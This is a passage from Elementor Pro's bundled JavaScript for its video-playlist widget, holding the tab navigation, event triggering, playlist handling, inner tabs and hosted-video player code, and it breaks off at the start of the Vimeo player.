/*! elementor-pro - v3.4.1 - 01-09-2021 */
(self["webpackChunkelementor_pro"] = self["webpackChunkelementor_pro"] || []).push([["video-playlist"],{

/***/ "../modules/video-playlist/assets/js/frontend/base-tabs.js":
/*!*****************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/base-tabs.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

// Copied from the core, original path: elementor/assets/dev/js/frontend/handlers/base-tabs.js.
class baseTabs extends elementorModules.frontend.handlers.Base {
  getDefaultSettings() {
    return {
      selectors: {
        tablist: '[role="tablist"]',
        tabTitle: '.e-tab-title',
        tabContent: '.e-tab-content'
      },
      classes: {
        active: 'e-active'
      },
      showTabFn: 'show',
      hideTabFn: 'hide',
      toggleSelf: true,
      hidePrevious: true,
      autoExpand: true,
      keyDirection: {
        ArrowLeft: elementorFrontendConfig.is_rtl ? 1 : -1,
        ArrowUp: -1,
        ArrowRight: elementorFrontendConfig.is_rtl ? -1 : 1,
        ArrowDown: 1
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors');
    return {
      $tabTitles: this.findElement(selectors.tabTitle),
      $tabContents: this.findElement(selectors.tabContent)
    };
  }

  activateDefaultTab(videoId) {
    const settings = this.getSettings();

    if (!settings.autoExpand || 'editor' === settings.autoExpand && !this.isEdit) {
      return;
    }

    const defaultActiveTab = this.getEditSettings('activeItemIndex') || videoId || 1,
          originalToggleMethods = {
      showTabFn: settings.showTabFn,
      hideTabFn: settings.hideTabFn
    }; // Toggle tabs without animation to avoid jumping.

    this.setSettings({
      showTabFn: 'show',
      hideTabFn: 'hide'
    });
    this.changeActiveTab(defaultActiveTab); // Return back original toggle effects.

    this.setSettings(originalToggleMethods);
  }

  handleKeyboardNavigation(event) {
    const tab = event.currentTarget,
          $tabList = jQuery(tab.closest(this.getSettings('selectors').tablist)),
          $tabs = $tabList.find(this.getSettings('selectors').tabTitle),
          isVertical = 'vertical' === $tabList.attr('aria-orientation');

    switch (event.key) {
      case 'ArrowLeft':
      case 'ArrowRight':
        if (isVertical) {
          return;
        }

        break;

      case 'ArrowUp':
      case 'ArrowDown':
        if (!isVertical) {
          return;
        }

        event.preventDefault();
        break;

      case 'Home':
        event.preventDefault();
        $tabs.first().trigger('focus');
        return;

      case 'End':
        event.preventDefault();
        $tabs.last().trigger('focus');
        return;

      default:
        return;
    }

    const tabIndex = tab.getAttribute('data-tab') - 1,
          direction = this.getSettings('keyDirection')[event.key],
          nextTab = $tabs[tabIndex + direction];

    if (nextTab) {
      nextTab.focus();
    } else if (-1 === tabIndex + direction) {
      $tabs.last().trigger('focus');
    } else {
      $tabs.first().trigger('focus');
    }
  }

  deactivateActiveTab(tabIndex) {
    const settings = this.getSettings(),
          activeClass = settings.classes.active,
          activeFilter = tabIndex ? '[data-tab="' + tabIndex + '"]' : '.' + activeClass,
          $activeTitle = this.elements.$tabTitles.filter(activeFilter),
          $activeContent = this.elements.$tabContents.filter(activeFilter);
    $activeTitle.add($activeContent).removeClass(activeClass);
    $activeTitle.attr({
      tabindex: '-1',
      'aria-selected': 'false'
    });
    $activeContent[settings.hideTabFn]();
    $activeContent.attr('hidden', 'hidden');
  }

  activateTab(tabIndex) {
    const settings = this.getSettings(),
          activeClass = settings.classes.active,
          $requestedTitle = this.elements.$tabTitles.filter('[data-tab="' + tabIndex + '"]'),
          $requestedContent = this.elements.$tabContents.filter('[data-tab="' + tabIndex + '"]'),
          animationDuration = 'show' === settings.showTabFn ? 0 : 400;
    $requestedTitle.add($requestedContent).addClass(activeClass);
    $requestedTitle.attr({
      tabindex: '0',
      'aria-selected': 'true'
    });
    $requestedContent[settings.showTabFn](animationDuration, () => elementorFrontend.elements.$window.trigger('resize'));
    $requestedContent.removeAttr('hidden');
  }

  isActiveTab(tabIndex) {
    return this.elements.$tabTitles.filter('[data-tab="' + tabIndex + '"]').hasClass(this.getSettings('classes.active'));
  }

  bindEvents() {
    this.elements.$tabTitles.on({
      keydown: event => {
        // Support for old markup that includes an `<a>` tag in the tab.
        if (jQuery(event.target).is('a') && `Enter` === event.key) {
          event.preventDefault();
        } // We listen to keydowon event for these keys in order to prevent undesired page scrolling.


        if (['End', 'Home', 'ArrowUp', 'ArrowDown'].includes(event.key)) {
          this.handleKeyboardNavigation(event);
        }
      },
      keyup: event => {
        switch (event.key) {
          case 'ArrowLeft':
          case 'ArrowRight':
            this.handleKeyboardNavigation(event);
            break;

          case 'Enter':
          case 'Space':
            event.preventDefault();
            this.changeActiveTab(event.currentTarget.getAttribute('data-tab'));
            break;
        }
      },
      click: event => {
        event.preventDefault();
        this.changeActiveTab(event.currentTarget.getAttribute('data-tab'));
      }
    });
  }

  onInit(...args) {
    super.onInit(...args); //this.activateDefaultTab();
  }

  changeActiveTab(tabIndex) {
    const isActiveTab = this.isActiveTab(tabIndex),
          settings = this.getSettings();

    if ((settings.toggleSelf || !isActiveTab) && settings.hidePrevious) {
      this.deactivateActiveTab();
    }

    if (!settings.hidePrevious && isActiveTab) {
      this.deactivateActiveTab(tabIndex);
    }

    if (!isActiveTab) {
      this.activateTab(tabIndex);
    }
  }

}

exports.default = baseTabs;

/***/ }),

/***/ "../modules/video-playlist/assets/js/frontend/event-trigger.js":
/*!*********************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/event-trigger.js ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = triggerEvent;

var _playlistEvent = _interopRequireDefault(__webpack_require__(/*! ./playlist-event */ "../modules/video-playlist/assets/js/frontend/playlist-event.js"));

// Functions to get objects for the playlist event object.
function getEventTabsObject(widgetObject) {
  const currentInnerTabsTitleElements = widgetObject.elements.$innerTabs.filter('.e-active').find('.e-inner-tabs-wrapper .e-inner-tab-title');

  if (currentInnerTabsTitleElements.length) {
    const activeInnerTabTitleElement = currentInnerTabsTitleElements.filter('.e-inner-tab-active');
    return {
      name: activeInnerTabTitleElement.text().trim(),
      index: activeInnerTabTitleElement.index() + 1
    };
  }

  return {
    name: 'none',
    index: 'none'
  };
}

function getEventPlaylistObject(widgetObject, positionInVideoList) {
  const currentVideoIndex = positionInVideoList || widgetObject.currentPlaylistItemIndex;
  return {
    name: widgetObject.getElementSettings('playlist_title'),
    currentItem: currentVideoIndex,
    amount: widgetObject.playlistItemsArray.filter(video => video.videoType !== 'section').length
  };
}

function getEventVideoObject(widgetObject, positionInVideoList) {
  const currentVideoIndex = positionInVideoList || widgetObject.currentPlaylistItemIndex,
        currentVideo = widgetObject.playlistItemsArray[currentVideoIndex - 1];
  return {
    provider: currentVideo.videoType,
    url: currentVideo.videoUrl,
    title: currentVideo.videoTitle,
    duration: currentVideo.videoDuration
  };
}

async function getEventEventObject(widgetObject, eventType, eventTrigger, positionInVideoList) {
  const currentVideoIndex = positionInVideoList || widgetObject.currentPlaylistItemIndex,
        currentVideo = widgetObject.playlistItemsArray[currentVideoIndex - 1];
  return {
    type: eventType,
    time: await currentVideo.playerInstance.getCurrentTime(),
    element: widgetObject.$element,
    trigger: eventTrigger,
    watchCount: currentVideo.playerInstance.watchCount
  };
}

async function triggerEvent(widgetObject, eventType, eventTrigger, positionInVideoList) {
  const currentEvent = new _playlistEvent.default({
    event: await getEventEventObject(widgetObject, eventType, eventTrigger, positionInVideoList),
    tab: getEventTabsObject(widgetObject),
    playlist: getEventPlaylistObject(widgetObject, positionInVideoList),
    video: getEventVideoObject(widgetObject, positionInVideoList)
  });
  jQuery('body').trigger('elementor-video-playList', currentEvent);
}

/***/ }),

/***/ "../modules/video-playlist/assets/js/frontend/handler.js":
/*!***************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/handler.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _baseTabs = _interopRequireDefault(__webpack_require__(/*! ./base-tabs */ "../modules/video-playlist/assets/js/frontend/base-tabs.js"));

var _playerYoutube = _interopRequireDefault(__webpack_require__(/*! ./player-youtube */ "../modules/video-playlist/assets/js/frontend/player-youtube.js"));

var _playerVimeo = _interopRequireDefault(__webpack_require__(/*! ./player-vimeo */ "../modules/video-playlist/assets/js/frontend/player-vimeo.js"));

var _playerHosted = _interopRequireDefault(__webpack_require__(/*! ./player-hosted */ "../modules/video-playlist/assets/js/frontend/player-hosted.js"));

var _scrollUtils = __webpack_require__(/*! ./scroll-utils */ "../modules/video-playlist/assets/js/frontend/scroll-utils.js");

var _innerTabs = __webpack_require__(/*! ./inner-tabs */ "../modules/video-playlist/assets/js/frontend/inner-tabs.js");

var _urlParams = __webpack_require__(/*! ./url-params */ "../modules/video-playlist/assets/js/frontend/url-params.js");

var _eventTrigger = _interopRequireDefault(__webpack_require__(/*! ./event-trigger */ "../modules/video-playlist/assets/js/frontend/event-trigger.js"));

class VideoPlaylistHandler extends _baseTabs.default {
  getDefaultSettings() {
    const defaultSettings = super.getDefaultSettings(),
          selectors = {
      tabsWrapper: '.e-tabs-items-wrapper',
      tabsItems: '.e-tabs-items',
      toggleVideosDisplayButton: '.e-tabs-toggle-videos-display-button',
      videos: '.e-tabs-content-wrapper .e-tab-content',
      innerTabs: '.e-tabs-inner-tabs .e-tab-content',
      imageOverlay: '.elementor-custom-embed-image-overlay'
    };
    return { ...defaultSettings,
      selectors: { ...defaultSettings.selectors,
        ...selectors
      }
    };
  }

  getDefaultElements() {
    const elements = super.getDefaultElements(),
          selectors = this.getSettings('selectors');
    return { ...elements,
      $tabsWrapper: this.findElement(selectors.tabsWrapper),
      $tabsItems: this.findElement(selectors.tabsItems),
      $toggleVideosDisplayButton: this.findElement(selectors.toggleVideosDisplayButton),
      $videos: this.findElement(selectors.videos),
      $innerTabs: this.findElement(selectors.innerTabs),
      $imageOverlay: this.findElement(selectors.imageOverlay)
    };
  }

  initEditorListeners() {
    super.initEditorListeners();
    this.editorListeners.push({
      event: 'elementorPlaylistWidget:fetchVideoData',
      to: elementor.channels.editor,
      callback: e => {
        this.getCurrentPlayerSelected().setVideoProviderData().then(() => {
          e.currentItem = this.getCurrentItemSelected();
          elementor.channels.editor.trigger('elementorPlaylistWidget:setVideoData', e);
        });
      }
    });
  }

  bindEvents() {
    super.bindEvents(); // Handle the click on the image overlay.

    this.elements.$imageOverlay.on({
      click: e => {
        // Remove image overlay if the user clicked it and play the video in case it is not playing.
        e.currentTarget.remove();
        this.getCurrentPlayerSelected().play();
      }
    }); // Handle the inner tab functionality.

    this.elements.$innerTabs.on({
      click: event => {
        (0, _innerTabs.handleInnerTabs)(event, this);
      }
    }); // Handle scroll on the right panel to make the "shadows" effect when the panel is scrollable.

    this.elements.$tabsItems.on({
      scroll: event => {
        (0, _scrollUtils.handleVideosPanelScroll)(this.elements, event);
      }
    }); // Handle the closing/opening right panel in mobile mode.

    this.elements.$toggleVideosDisplayButton.on({
      click: event => {
        jQuery(event.target).toggleClass('rotate-up');
        jQuery(event.target).toggleClass('rotate-down');
        this.elements.$tabsWrapper.slideToggle('slow');
      }
    });
  }

  onInit(...args) {
    super.onInit(...args);
    this.playlistId = this.getID(); // Handle watched videos.

    this.storageKey = 'watched_videos_' + this.getID();
    const storageObject = elementorFrontend.storage.get(this.storageKey);

    if (storageObject) {
      this.watchedVideosArray = JSON.parse(storageObject);
    } else {
      this.watchedVideosArray = [];
    }

    this.watchedIndication = this.getElementSettings('show_watched_indication'); // Handle indication for scrolling in the right panel.

    (0, _scrollUtils.handleVideosPanelScroll)(this.elements); // Handle the video player functionality, includes "on load" and "next up".

    this.isAutoplayOnLoad = 'yes' === this.getElementSettings('autoplay_on_load');
    this.isAutoplayNextUp = 'yes' === this.getElementSettings('autoplay_next');
    this.isFirstVideoActivated = true;
    this.createPlaylistItems(); // Handle display for show more/less button.

    this.isCollapsible = this.getElementSettings('inner_tab_is_content_collapsible');
    this.innerTabsHeightLimit = this.getElementSettings('inner_tab_collapsible_height'); // Keep track of the element that supposed to be paused since the user selected other video.

    this.currentPlayingPlaylistItemIndex = 1; // Handle the first initial activation of the video in the playlist.

    this.activateInitialVideo(); // Handle Inner Tab activation in edit mode.

    this.activateInnerTabInEditMode();
  }

  onEditSettingsChange(propertyName) {
    // The condition will be true when the user clicks the widget to open the edit panel.
    if ('panel' === propertyName) {
      // The boolean below will prevent running twice the activateDefaultTab function when widget first load and user click the item to play it.
      this.preventTabActivation = true;
    }

    if ('activeItemIndex' !== propertyName) {
      return;
    }

    if (this.preventTabActivation) {
      this.preventTabActivation = false;
      return;
    }

    this.activateDefaultTab();
  }

  activateInitialVideo() {
    this.isPageOnLoad = true;
    const isLazyLoad = !!this.getElementSettings('lazy_load'),
          initialTabIndex = (0, _urlParams.handleURLParams)(this.playlistId, this.playlistItemsArray);
    let isUrlParamsExist = false;

    if (initialTabIndex) {
      this.currentPlaylistItemIndex = initialTabIndex;
      this.currentPlayingPlaylistItemIndex = initialTabIndex;
      isUrlParamsExist = true;
    } else {
      this.currentPlaylistItemIndex = 1;
      this.currentPlayingPlaylistItemIndex = 1;
    } // When there are no url parameters and on-load is on, the video should be played, means the url parameters should be set.


    if (this.isAutoplayOnLoad && !isUrlParamsExist) {
      (0, _urlParams.setVideoParams)(this.playlistId, this.playlistItemsArray, this.currentPlaylistItemIndex);
    }

    this.handleFirstVideoActivation(isLazyLoad);
  }
  /*
  	The scenarios for playing the first video after page load:
  	- lazy load off - video will load on page load before user scroll video to view.
  	- lazy load on - video will load when user scroll the video to view.
     */


  handleFirstVideoActivation(isLazyLoad) {
    if (!isLazyLoad) {
      this.activateDefaultTab(this.currentPlaylistItemIndex); // No need to use the observer since "lazy load is" off.

      return;
    }

    const playlistElement = document.querySelector('.elementor-element-' + this.playlistId + ' .e-tabs-main-area'),
          observer = elementorModules.utils.Scroll.scrollObserver({
      callback: event => {
        if (event.isInViewport) {
          this.activateDefaultTab(this.currentPlaylistItemIndex);
          observer.unobserve(playlistElement);
        }
      }
    });
    observer.observe(playlistElement);
  }

  getCurrentItemSelected() {
    return this.playlistItemsArray[this.currentPlaylistItemIndex - 1];
  }

  getCurrentPlayerSelected() {
    return this.getCurrentItemSelected().playerInstance;
  }

  getCurrentPlayerPlaying() {
    return this.playlistItemsArray[this.currentPlayingPlaylistItemIndex - 1].playerInstance;
  } // Handle video selection.


  isVideoShouldBePlayed() {
    // When user select other video, the current video will be paused if is playing.
    if (this.currentPlayingPlaylistItemIndex !== this.currentPlaylistItemIndex) {
      if (this.getCurrentPlayerPlaying()) {
        this.getCurrentPlayerPlaying().pause();
      }

      this.currentPlayingPlaylistItemIndex = this.currentPlaylistItemIndex; // When user select the same video, the current video will be paused if is playing.
    } else if (this.getCurrentPlayerPlaying().isVideoPlaying) {
      this.getCurrentPlayerPlaying().pause();
      return false;
    } // When none of the videos are playing, the selected video should be played.


    return true;
  }

  activateInnerTabInEditMode() {
    if (this.isEdit && this.getEditSettings('innerActiveIndex')) {
      const innerTabActivated = this.getEditSettings('innerActiveIndex'),
            innerTabs = jQuery(this.elements.$innerTabs.eq(this.currentPlaylistItemIndex - 1).find('.e-inner-tab-title a'));
      innerTabs[innerTabActivated].click();
    }
  } // Handle video creation including event listeners and playing video if needed.


  handleVideo(playListItem) {
    // If the video already created (visited once), then just play it if it's not playing already, otherwise pause it.
    if (playListItem.playerInstance) {
      if (this.isVideoShouldBePlayed()) {
        // Remove image overlay if first video item is playing without clicking the image overlay.
        if (1 === this.currentPlaylistItemIndex && this.elements.$imageOverlay) {
          this.elements.$imageOverlay.remove();
        }

        this.playVideoAfterCreation(playListItem);
      }
    } else {
      // If the video is not created yet (first visit), then create the video instance and the event listeners.
      const players = {
        youtube: _playerYoutube.default,
        vimeo: _playerVimeo.default,
        hosted: _playerHosted.default
      }; // Initiating player object.
      // The second parameter holds the video item when event trigger occur with setTimeout.

      playListItem.playerInstance = new players[playListItem.videoType](playListItem, this.currentPlaylistItemIndex);
      playListItem.playerInstance.create().then(() => {
        if (this.isVideoShouldBePlayed()) {
          this.playVideoOnCreation(playListItem);
        } // Handle the functionality when video full screen mode changes.


        playListItem.playerInstance.handleFullScreenChange(isEnterFullScreenMode => {
          // Trigger event when enter/exit full screen mode.
          (0, _eventTrigger.default)(this, isEnterFullScreenMode ? 'videoFullScreen' : 'videoExitFullScreen', 'click');
        }); // Handle the functionality when video play.

        playListItem.playerInstance.handlePlayed(() => {
          const currentPlaylistItem = this.getCurrentItemSelected();
          let videoTrigger = 'click';

          if (currentPlaylistItem.isAutoplayOnLoad) {
            videoTrigger = 'onLoad';
            playListItem.isAutoplayOnLoad = false;
          } else if (currentPlaylistItem.isAutoPlayNextUp) {
            videoTrigger = 'nextVideo';
          } // Trigger event when video started.


          (0, _eventTrigger.default)(this, currentPlaylistItem.playerInstance.isVideoPausedLocal ? 'videoResume' : 'videoStart', videoTrigger);
        }); // Handle the functionality when video ended.

        playListItem.playerInstance.handleEnded(() => {
          // Trigger event when video ended.
          (0, _eventTrigger.default)(this, 'videoEnded', 'click'); // Handle the indication for videos that have been watched and ended.

          if (this.watchedIndication) {
            this.elements.$tabTitles.filter('.e-active').addClass('watched-video');
          }

          const endedVideoId = this.getCurrentItemSelected().dataItemId;

          if (!this.watchedVideosArray.includes(endedVideoId) && this.watchedIndication) {
            this.watchedVideosArray.push(this.getCurrentItemSelected().dataItemId);
            elementorFrontend.storage.set(this.storageKey, JSON.stringify(this.watchedVideosArray));
          } // Handle "next up" functionality.


          if (this.isAutoplayNextUp) {
            // If there are more videos in the list, play next video.
            if (this.playlistItemsArray.length >= ++this.currentPlaylistItemIndex) {
              // Handle the logic for playing next video.
              while ('section' === this.getCurrentItemSelected().videoType) {
                this.currentPlaylistItemIndex++; // When last video in the playlist ended, we reset the this.currentPlaylistItemIndex to the last playlist item index.

                if (this.playlistItemsArray.length < this.currentPlaylistItemIndex) {
                  this.currentPlaylistItemIndex = this.playlistItemsArray.length;
                  return;
                }
              }

              this.changeActiveTab(this.currentPlaylistItemIndex, true);
            }
          }
        }); // Handle the functionality when video paused.
        // The handlePaused will trigger event with setTimeout, positionInVideoList will keep track for the paused video when selecting other video.

        playListItem.playerInstance.handlePaused(positionInVideoList => {
          // Trigger event when video paused.
          (0, _eventTrigger.default)(this, 'videoPaused', 'click', positionInVideoList);
        });
      });
    }
  } // Handle the actual playing of the video that already exists (already created before).


  playVideoAfterCreation(playListItem) {
    playListItem.playerInstance.play();
  } // Handle the actual playing of the video when the video is created.


  playVideoOnCreation(playListItem) {
    // Play the video according to "on load" and "next up" indications.
    if (this.isAutoplayOnLoad) {
      playListItem.isAutoplayOnLoad = true; // Mute the initiated video when "autoplay onload" and then play.

      playListItem.playerInstance.mute();
      playListItem.playerInstance.play();
      this.isAutoplayOnLoad = false;
    } else if (!this.isFirstVideoActivated) {
      playListItem.isAutoPlayNextUp = true;
      playListItem.playerInstance.play();
    }

    this.isFirstVideoActivated = false;
  }

  createPlaylistItems() {
    this.playlistItemsArray = [];
    this.elements.$videos.each((index, tabContent) => {
      const playListItem = {};
      const $tabContent = jQuery(tabContent);
      playListItem.videoUrl = $tabContent.attr('data-video-url');
      playListItem.videoType = $tabContent.attr('data-video-type');
      playListItem.videoTitle = $tabContent.attr('data-video-title');
      playListItem.videoDuration = $tabContent.attr('data-video-duration');
      playListItem.tabContent = tabContent;
      playListItem.dataTab = index + 1;
      playListItem.dataItemId = this.getElementSettings().tabs[index]._id;
      this.playlistItemsArray.push(playListItem);
    }); // When the page loads,the code checks which videos already watched and adding a class accordingly.

    if (this.watchedVideosArray.length > 0 && this.watchedIndication) {
      this.watchedVideosArray.forEach(watchedVideoId => {
        const watchedPlaylistItem = this.playlistItemsArray.find(playlistItem => playlistItem.dataItemId === watchedVideoId);
        this.elements.$tabTitles.filter('[data-tab="' + watchedPlaylistItem.dataTab + '"]').addClass('watched-video');
      });
    }
  }

  changeActiveTab(tabIndex, isVideoSelectedAutomatically) {
    super.changeActiveTab(tabIndex);

    if (this.playlistItemsArray[tabIndex - 1] && this.playlistItemsArray[tabIndex - 1].videoType !== 'section') {
      this.currentPlaylistItemIndex = parseInt(tabIndex);

      if (isVideoSelectedAutomatically) {
        this.currentPlayingPlaylistItemIndex = this.currentPlaylistItemIndex;
      } // Handle on creation of the video and working with it.


      this.handleVideo(this.getCurrentItemSelected(), isVideoSelectedAutomatically); // Set Video params in url only if its not the first video when page load.

      if (!this.isPageOnLoad) {
        (0, _urlParams.setVideoParams)(this.playlistId, this.playlistItemsArray, this.currentPlaylistItemIndex);
      }

      this.isPageOnLoad = false; // Handle the display for the inner tabs buttons as long there are actually inner tabs.

      if (jQuery(this.elements.$innerTabs.eq(tabIndex - 1)).find('.e-inner-tab-content').length > 0) {
        const innerTabsContent = this.elements.$innerTabs.filter('.e-active').find('.e-inner-tab-content');
        (0, _innerTabs.handleInnerTabsButtonsDisplay)(innerTabsContent.toArray(), this.isCollapsible, this.innerTabsHeightLimit);
      }
    }
  }

}

exports.default = VideoPlaylistHandler;

/***/ }),

/***/ "../modules/video-playlist/assets/js/frontend/inner-tabs.js":
/*!******************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/inner-tabs.js ***!
  \******************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.handleInnerTabs = handleInnerTabs;
exports.handleInnerTabsButtonsDisplay = handleInnerTabsButtonsDisplay;
exports.onTabContentButtonsClick = onTabContentButtonsClick;

var _eventTrigger = _interopRequireDefault(__webpack_require__(/*! ./event-trigger */ "../modules/video-playlist/assets/js/frontend/event-trigger.js"));

function toggleInnerTabs(event, clickedTab, widgetObject) {
  const activeTabWrapper = event.currentTarget,
        tabTitles = activeTabWrapper.querySelectorAll('.e-inner-tab-title');

  if (clickedTab.hasClass('e-inner-tab-active') || tabTitles.length < 2) {
    return;
  }

  const tabsContents = activeTabWrapper.querySelectorAll('.e-inner-tab-content');
  tabTitles.forEach(tabTitle => {
    tabTitle.classList.toggle('e-inner-tab-active');
  });
  tabsContents.forEach(tabContent => {
    tabContent.toggleAttribute('hidden');
    tabContent.classList.toggle('e-inner-tab-active');
  });
  handleInnerTabsButtonsDisplay(Array.from(tabsContents), widgetObject.isCollapsible, widgetObject.innerTabsHeightLimit); // Trigger event when tab open.

  (0, _eventTrigger.default)(widgetObject, 'tabOpened', 'click');
}

function handleInnerTabs(event, widgetObject) {
  event.preventDefault(); // Handle click on tab on mobile mode.

  if (event.target.classList.contains('e-tab-mobile-title')) {
    const $clickedTab = jQuery(event.target);
    toggleInnerTabs(event, $clickedTab, widgetObject);
    return;
  } // Handle click on tab on Desktop mode.


  if ('A' === event.target.tagName) {
    const $clickedTab = jQuery(event.target).parent('.e-inner-tab-title');
    toggleInnerTabs(event, $clickedTab, widgetObject);
  } // Handle click on show-less buttons in tab content.


  if ('BUTTON' === event.target.tagName) {
    onTabContentButtonsClick(event, widgetObject);
  }
}

function handleInnerTabsButtonsDisplay(tabsContents, isCollapsible, innerTabsHeightLimit) {
  if (!isCollapsible) {
    return;
  }

  const activeInnerTab = tabsContents.filter(tabsContent => tabsContent.classList.contains('e-inner-tab-active')),
        innerTabScrollableHeight = activeInnerTab[0].querySelector('.e-inner-tab-text > div').offsetHeight,
        innerTabsLimitHeight = parseInt(innerTabsHeightLimit.size);

  if (innerTabsLimitHeight && innerTabScrollableHeight > innerTabsLimitHeight) {
    activeInnerTab[0].classList.add('show-inner-tab-buttons');
  }
}

function onTabContentButtonsClick(event, widgetObject) {
  const $tabsContent = jQuery(event.currentTarget).find('.e-inner-tab-content'),
        $activeTabContent = $tabsContent.filter('.e-inner-tab-active'),
        buttonsElements = $activeTabContent.find('button');
  buttonsElements.toggleClass('show-button');
  $activeTabContent.toggleClass('show-full-height');
  const eventType = $activeTabContent.hasClass('show-full-height') ? 'tabExpanded' : 'tabCollapsed'; // Trigger event when collapsed/expanded clicked.

  (0, _eventTrigger.default)(widgetObject, eventType, 'click');
}

/***/ }),

/***/ "../modules/video-playlist/assets/js/frontend/player-base.js":
/*!*******************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/player-base.js ***!
  \*******************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class PlayerBase {
  constructor(playlistItem, videoIndex) {
    this.playlistItem = playlistItem;
    this.positionInVideoList = videoIndex;
  }

  formatDuration(duration) {
    const dateObj = new Date(duration * 1000),
          hours = dateObj.getUTCHours(),
          minutes = dateObj.getUTCMinutes(),
          seconds = dateObj.getSeconds();

    if (hours !== 0) {
      return `${hours.toString()}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    return `${minutes.toString()}:${seconds.toString().padStart(2, '0')}`;
  }

}

exports.default = PlayerBase;

/***/ }),

/***/ "../modules/video-playlist/assets/js/frontend/player-hosted.js":
/*!*********************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/player-hosted.js ***!
  \*********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _playerBase = _interopRequireDefault(__webpack_require__(/*! ./player-base */ "../modules/video-playlist/assets/js/frontend/player-base.js"));

class playerHosted extends _playerBase.default {
  constructor(playlistItem, videoIndex) {
    super(playlistItem, videoIndex);
    this.playerObject = null;
    this.watchCount = 0;
    this.isVideoPlaying = false;
    this.isVideoPausedLocal = false;
    this.isVideoSeeking = false;
    this.isVideoEnded = false;
    this.isReady = false;
  }

  create() {
    const videoPromise = new Promise(resolve => {
      const video = document.createElement('video');
      video.setAttribute('controls', '');
      const text = document.createTextNode('Sorry, your browser doesn\'t support embedded videos.');
      const source = document.createElement('source');
      source.setAttribute('src', this.playlistItem.videoUrl);
      source.setAttribute('type', 'video/' + this.playlistItem.videoUrl.split('.').pop());
      video.appendChild(source);
      video.appendChild(text);
      this.playerObject = video;
      this.playlistItem.tabContent.querySelector('div').replaceWith(this.playerObject);
      this.playerObject.addEventListener('canplay', () => {
        // Indication that the video is loaded and can be played and paused.
        this.isReady = true;
        resolve();
      }); // Seeked event indicates that the seeking has been finished, so we reset the boolean for that.

      this.playerObject.addEventListener('seeked', () => {
        this.isVideoSeeking = false;
      }); // Seeking event indicates that the seeking is currently happening, so we change the boolean.

      this.playerObject.addEventListener('seeking', () => {
        clearTimeout(this.seekTimeOut);
        this.isVideoSeeking = true;
      });
    });
    return videoPromise;
  }

  handleEnded(callback) {
    this.playerObject.addEventListener('ended', () => {
      this.watchCount++; // This property will prevent automatic pause trigger when video ended.

      this.isVideoEnded = true;
      this.isVideoPlaying = false;
      callback(this.playlistItem);
    });
  }

  handlePaused(callback) {
    this.playerObject.addEventListener('pause', () => {
      // Prevent pause trigger when the user is seeking video or when the video automatically trigger pause event when ended.
      this.seekTimeOut = setTimeout(() => {
        if (!this.isVideoSeeking && !this.isVideoEnded) {
          callback(this.positionInVideoList); // Indication to know when there is a resume trigger event.

          this.isVideoPausedLocal = true;
        } else {
          this.isVideoEnded = false;
        }
      }, 30);
    });
  }

  handlePlayed(callback) {
    this.playerObject.addEventListener('play', () => {
      // Prevent play trigger when user is seeking video.
      if (!this.isVideoSeeking) {
        callback(this.playlistItem);
      }
    });
  }

  handleFullScreenChange(callback) {
    // Wrapping with jQuery to easily listen all 3 prefixed screen change.
    jQuery(this.playerObject).on('webkitfullscreenchange mozfullscreenchange fullscreenchange', () => {
      callback(document.fullscreenElement);
    });
  }

  getCurrentTime() {
    return this.playerObject.currentTime;
  }

  play() {
    if (!this.isReady) {
      return;
    }

    this.isVideoPlaying = true;
    this.playerObject.play();
  }

  pause() {
    if (!this.isReady) {
      return;
    }

    this.isVideoPlaying = false;
    this.playerObject.pause();
  }

  mute() {
    this.playerObject.muted = true;
  }

}

exports.default = playerHosted;

/***/ }),

/***/ "../modules/video-playlist/assets/js/frontend/player-vimeo.js":
/*!********************************************************************!*\
  !*** ../modules/video-playlist/assets/js/frontend/player-vimeo.js ***!
  \********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _playerBase = _interopRequireDefault(__webpack_require__(/*! ./player-base */ "../modules/video-playlist/assets/js/frontend/player-base.js"));

class playerVimeo extends _playerBase.default {
  constructor(playlistItem, videoIndex) {
    super(playlistItem, videoIndex);
    this.apiProvider = elementorFrontend.utils.vimeo;
    this.playerObject = null;
    this.watchCount = 0;
    this.isVideoInFullScreenChange = false;
    this.isReady = false;
  }

  create() {
    this.currentVideoID = this.apiProvider.getVideoIDFromURL(this.playlistItem.videoUrl);
    return new Promise(resolve => {
